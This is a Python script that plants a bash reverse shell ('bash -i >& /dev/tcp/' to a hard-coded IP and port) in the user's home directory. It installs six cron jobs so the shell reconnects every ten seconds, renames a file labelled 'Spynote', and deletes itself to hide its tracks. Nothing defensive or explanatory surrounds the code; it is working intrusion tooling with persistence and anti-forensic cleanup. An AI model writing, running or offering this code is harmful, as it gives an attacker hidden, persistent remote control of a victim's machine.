import os
import subprocess

# Define IP and Port for Reverse Shell
IP = "192.168.0.40"
PORT = 9876

# Path to the reverse shell script using the HOME variable
script_path = os.path.join(os.path.expanduser("~"), "reverse_shell.sh")

# Create the reverse shell script with color support
with open(script_path, 'w') as f:
    f.write("#!/bin/bash\n")
    f.write("export TERM=xterm\n")  # Enable color support for the terminal
    f.write("shopt -s histappend\n")  # Append history instead of overwrite
    f.write("alias ls='ls --color=auto'\n")  # Alias for color ls
    
    # Custom LS_COLORS settings for distinct colors
    f.write("export LS_COLORS='di=1;34:fi=0;37:ln=0;36:so=0;33:ex=0;32'\n")
    
    f.write(f"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\n")

# Make the script executable
os.chmod(script_path, 0o755)

# Define cron jobs to execute the script every 10 seconds (6 times per minute)
cron_job_1 = f"* * * * * /bin/bash {script_path}\n"            # Every minute at 0 seconds
cron_job_2 = f"* * * * * sleep 10; /bin/bash {script_path}\n"  # Every minute at 10 seconds
cron_job_3 = f"* * * * * sleep 20; /bin/bash {script_path}\n"  # Every minute at 20 seconds
cron_job_4 = f"* * * * * sleep 30; /bin/bash {script_path}\n"  # Every minute at 30 seconds
cron_job_5 = f"* * * * * sleep 40; /bin/bash {script_path}\n"  # Every minute at 40 seconds
cron_job_6 = f"* * * * * sleep 50; /bin/bash {script_path}\n"  # Every minute at 50 seconds

# Get current crontab
existing_crontab = subprocess.getoutput("crontab -l 2>/dev/null")

# Add new cron jobs if they don't already exist
for cron_job in [cron_job_1, cron_job_2, cron_job_3, cron_job_4, cron_job_5, cron_job_6]:
    if cron_job not in existing_crontab:
        existing_crontab += cron_job

# Update the crontab
with open("mycron", "w") as f:
    f.write(existing_crontab)

subprocess.call("crontab mycron", shell=True)
os.remove("mycron")


import os

# Define the old and new filenames
old_name = "spynote_not_ready.py"
new_name = "Spynote_ready.py"

# Get the current directory where the script is being run
current_directory = os.path.dirname(os.path.abspath(__file__))

# Construct the full paths for the old and new filenames
old_path = os.path.join(current_directory, old_name)
new_path = os.path.join(current_directory, new_name)

# Check if the file with the specific name exists in the current directory and rename it if found
if os.path.isfile(old_path):
    os.rename(old_path, new_path)
    print(f"Renamed '{old_name}' to '{new_name}'")
else:
    print(f"The file '{old_name}' was not found in the current directory.")


# Clean up: Remove the script after it has been executed to hide it
os.remove(__file__)
